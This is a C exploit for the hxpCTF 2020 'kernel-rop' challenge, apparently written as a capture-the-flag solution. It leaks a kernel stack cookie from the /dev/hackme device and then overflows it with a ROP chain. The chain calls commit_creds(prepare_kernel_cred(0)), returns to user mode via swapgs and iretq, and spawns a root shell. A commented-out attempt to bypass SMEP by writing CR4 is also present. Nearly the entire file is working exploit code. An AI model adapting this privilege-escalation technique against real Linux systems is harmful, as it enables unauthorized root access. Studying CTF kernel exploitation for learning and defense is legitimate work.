// hxpCTF 2020 kernel-rop Exploit
// SMEP

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int device_fd;

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;

void pwn(){
    puts("[*] Spawning shell on user land");
    uid_t uid = getuid();

    if (uid == 0){
        printf("[+] UID: %d, got root!");
    } else {
        printf("[-] UID: %d, could ot get root.");
        exit(-1);
    }

    system("/bin/sh");
}

unsigned long user_rip = (unsigned long) pwn;

void open_device(){
    device_fd = open("/dev/hackme", O_RDWR);
    if (device_fd < 0){
        puts("Failed to open /dev/hackme");
        exit(-1);
    } else {
        puts("Device /dev/hackme openned");
    }
}

unsigned long stack_cookie;
void get_stack_cookie(){
    // int tmp[32] has 32*4 of size = 128
    unsigned long stack[0x14]; // sizeof(unsigned long) = 8; 0x14 = 20
    // if stack cookie is right after tmp var in stack, stack cookie sould be in position position 16 of local stack array
    ssize_t r = read(device_fd, stack, sizeof(stack)); // 0x3a811aed457f8a00

    stack_cookie = stack[16];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Stack cookie: %lx\n", stack_cookie);

}

/* Functions Addresses */
unsigned long native_write_cr4 = 0xffffffff814443e0;
unsigned long commit_creds = 0xffffffff814c6410;
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
/* Functions Addresses */

/* Gadgets */
unsigned long xor_edi_call_rax = 0xffffffff8142c38c; // xor edi, edi ; mov r8, rdi ; call rax
unsigned long xor_edi_edi__mov_r8_rdi__call_rax = 0xffffffff8142c38c;
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long pop_rax_ret = 0xffffffff81004d11;
unsigned long iretq = 0xffffffff8100c0d9;

// 0xffffffff8100a55f : swapgs ; pop rbp ; ret
unsigned long swapgs__pop_rbp__ret = 0xffffffff8100a55f;

// 0xffffffff8166fea3 : mov rdi, rax ; jne 0xffffffff8166fe73 ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax__jne__pop_rbx__pop_rbp__ret = 0xffffffff8166fea3;

// 0xffffffff81007616 : pop rdx ; ret
unsigned long pop_rdx__ret = 0xffffffff81007616;

// 0xffffffff81964cc4 : cmp rdx, 8 ; jne 0xffffffff81964cb3 ; pop rbx ; pop rbp ; ret
unsigned long cmp_rdx_8__jne__pop_rbx_pop_rbp__ret = 0xffffffff81964cc4;
/* Gadgets */


void overflow(void){
    puts("[*] Trying to rewrite ret addr");

    unsigned long payload[50];
    int off = 16;

    // Trying to build entire rop chain to achieve commit_creds(prepare_kernel_cred(0))
    payload[off++] = stack_cookie;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    // Does not work because of CR4 pinning
    // payload[off++] = pop_rdi_ret;
    // payload[off++] = 0x6f0;
    // payload[off++] = native_write_cr4;

    // // So gonna try to build entire rop chain to achieve commit_creds(prepare_kernel_cred(0))
    // // "movabs rax, 0xffffffff814c67f0;" // prepare_kernel_cred function address
    // payload[off++] = pop_rax_ret;
    // payload[off++] = prepare_kernel_cred;
    
    // // Using a gadget for 2 operation at once. This will put zero into rdi
    // // then move rdi value to r8, not important
    // // then call rax (prepare_kernel_cred)
    // payload[off++] = xor_edi_edi__mov_r8_rdi__call_rax;

    // put 0 into rdi to be used as first argument of prepare_kernel_cred
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0x0;
    payload[off++] = prepare_kernel_cred; // ret address

    // setting ZERO register for not trigger jne in next gadget
    // Putting 0x8 to rdx then comparing it.
    payload[off++] = pop_rdx__ret;
    payload[off++] = 0x8;
    payload[off++] = cmp_rdx_8__jne__pop_rbx_pop_rbp__ret;
    payload[off++] = 0x0;
    payload[off++] = 0x0;

    // put rax value into rdi (prepare_kernel_cred return value)
    payload[off++] = mov_rdi_rax__jne__pop_rbx__pop_rbp__ret;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = commit_creds;


    // execute swapgs
    payload[off++] = swapgs__pop_rbp__ret;
    payload[off++] = 0x0; // for pop rbp

    // Execute iretq and put all values for context swap into stack
    payload[off++] = iretq;
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[+] Writting payload...");
    write(device_fd, payload, sizeof(payload));

}

void save_registers_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;" // push lower 16 bits of EFLAGS Register Onto the Stack
        "pop user_rflags;" // put first stack value (eflags)
        ".att_syntax;"
    );
}

int main(){
    open_device();
    get_stack_cookie();
    save_registers_state();
    overflow();
}
// $rdi = 0xffffc90000193e08 → 0xffffc90000193ef0 → 0x0000000000000000
// $rsi = 0xffffffffc0002440 → 0x00000000004b2fe0 → 0x0000000000000000
// 0xffffc900001bfe08 stack addr